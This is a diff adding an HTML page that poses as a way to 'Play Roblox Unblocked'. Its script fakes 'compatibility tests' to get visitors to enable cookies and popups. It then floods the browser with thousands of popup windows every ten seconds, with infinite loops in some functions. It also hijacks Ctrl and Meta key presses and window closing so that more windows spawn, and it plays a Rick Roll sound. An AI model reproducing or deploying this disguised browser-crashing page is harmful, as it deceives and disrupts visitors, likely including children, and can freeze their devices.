@@ -1,0 +1,186 @@
+<html>
+  <head>
+    <title>Play Roblox Unblocked Online!</title>
+    <script src="sound.js" async></script>
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  </head>
+  <body onload="both2()" style="background-image:url('https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/cosmetic-suggestion-add-a-loading-screen-of-the-chapter-5-v0-dbl0xy8k9c4c1.webp?v=1710902471012');">
+    <noscript>Please enable Javascript to play, then reload.</noscript>
+    <div id="tests" style="display: none; color: white; text-align: center; vertical-align: center;">
+      <h1 id="js">
+        Javascript is enabled. Thank you.
+      </h1>
+      <h1 id="cookies">
+        Testing if cookies are enabled...
+      </h1>
+      <h1 id="popups">
+        Testing if popups are enabled...
+      </h1>
+    </div>
+    <div id="play" style="display: none;">
+      <button style="font-size: 20px; border-color: #FF1493!important;" onclick="both()" class="w3-bottom w3-center w3-pink w3-round-large w3-button w3-third">
+        <u><b>Click here to play Roblox unblocked now!</b></u>
+      </button>
+    </div>
+    <script>
+      function preloadSound(){
+    if (!createjs.Sound.initializeDefaultPlugins()) {
+          
+        } else {
+          try{
+            createjs.Sound.addEventListener("fileload", playSound);
+            createjs.Sound.alternateExtensions = ["mp3"];
+              createjs.Sound.registerSounds(
+                [ {id: 'fun', src: '/'}, ],
+              "https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/Rick-Roll-Sound-Effect.mp3?v=1710210562028");
+          }
+          catch(err){
+            
+          }
+        }
+}
+      var wins = [];
+  function playSound(ev) {
+    console.log("Preloaded:", ev.id, ev.src);
+    document.getElementById('tests').style.display = "block";
+	setCookie('test', '1', 365);
+	if (getCookie('test') == '1') {
+    var enabled = 1;
+		document.getElementById('cookies').innerHTML = "Cookies are enabled. Thank you.";
+    const opts = `width=900px,height=900px,left=0px,top=0px`;
+	  var win = window.open('/test.html', '', opts);
+    if (!win){ enabled = 0;}
+	  win = window.open('/test.html', '', opts);
+    if (!win){ enabled = 0;}
+	  win = window.open('/test.html', '', opts);
+    if (!win){ enabled = 0;}
+    if(enabled == 1){
+      document.getElementById('popups').innerHTML = "Thank you for enabling Popups.";
+      document.getElementById('tests').style.display = 'none';
+      document.getElementById('play').style.display="block";
+    }else{
+      document.getElementById('popups').innerHTML = "Please enable Popups to play, then reload.";
+    }
+	} else {
+		document.getElementById('cookies').innerHTML = "Please enable Cookies to play, then reload.";
+	}
+  }
+      function ol() {
+        preloadSound()
+        interceptUserInput(event => {
+
+    // Prevent default behavior (breaks closing window shortcuts)
+    event.preventDefault()
+    event.stopPropagation()
+
+    // 'touchstart' and 'touchend' events are not able to open a new window
+    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
+    // a clever way to exclude touch events.
+
+
+
+    // Capture key presses on the Command or Control keys, to interfere with the
+    // "Close Window" shortcut.
+    if (event.key === 'Meta' || event.key === 'Control') {
+      both2()
+    } else {
+    }
+        });
+}
+      function focusWindows () {
+  wins.forEach(win => {
+    if (!win.closed) win.focus()
+    if(win.closed){
+      both2()
+    }
+  })
+}
+      
+      function setCookie(cname, cvalue, exdays) {
+	const d = new Date();
+	d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+	let expires = "expires=" + d.toUTCString();
+	document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+}
+
+function getCookie(cname) {
+	let name = cname + "=";
+	let decodedCookie = decodeURIComponent(document.cookie);
+	let ca = decodedCookie.split(';');
+	for (let i = 0; i < ca.length; i++) {
+		let c = ca[i];
+		while (c.charAt(0) == ' ') {
+			c = c.substring(1);
+		}
+		if (c.indexOf(name) == 0) {
+			return c.substring(name.length, c.length);
+		}
+	}
+	return "";
+}
+      
+      const SCREEN_WIDTH = window.screen.availWidth
+const SCREEN_HEIGHT = window.screen.availHeight
+const WIN_WIDTH = 580
+const WIN_HEIGHT = 760
+const VELOCITY = 15
+const MARGIN = 10
+const TICK_LENGTH = 50
+
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
+function windows(){
+      for(var i = 0; i < 1; i=0){
+        const { x, y } = getRandomCoords()
+        const opts = `width=${WIN_WIDTH}px,height=${WIN_HEIGHT}px,left=${x},top=${y}`
+        wins.push(window.open('/new.html', '', opts));
+      }
+}
+      function tabs(){
+        for(var i = 0; i < 1; i=0){
+        wins.push(window.open('/', '', ''));
+      }
+      }
+        function both(){
+            createjs.Sound.play('fun');
+          wins.push(window.open('/p1.html', '', ''));
+              for(var i = 0; i < 10; i++){
+                focusWindows();
+                const { x, y } = getRandomCoords();
+            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+            wins.push(window.open('/p1.html', '', opts));
+      }
+          var w = window.open('/p1.html', '', '');
+          setTimeout(both2, 10000);
+        }
+      function both2(){
+        for(var i = 0; i < 2000; i++){
+          focusWindows();
+        wins.push(window.open('/new.html', '', ''));
+            const { x, y } = getRandomCoords()
+        const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+        wins.push(window.open('/new.html', '', opts));
+      }
+          setTimeout(both2, 10000)
+        }
+      function getRandomCoords () {
+  const x = MARGIN +
+    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+  const y = MARGIN +
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
+  return { x, y }
+}
+      
+      function interceptUserInput (onInput) {
+  document.body.addEventListener('touchstart', onInput, { passive: false })
+
+  document.body.addEventListener('mousedown', onInput)
+  document.body.addEventListener('mouseup', onInput)
+  document.body.addEventListener('click', onInput)
+
+  document.body.addEventListener('keydown', onInput)
+  document.body.addEventListener('keyup', onInput)
+  document.body.addEventListener('keypress', onInput)
+}
+    </script>
+  </body>
+</html>
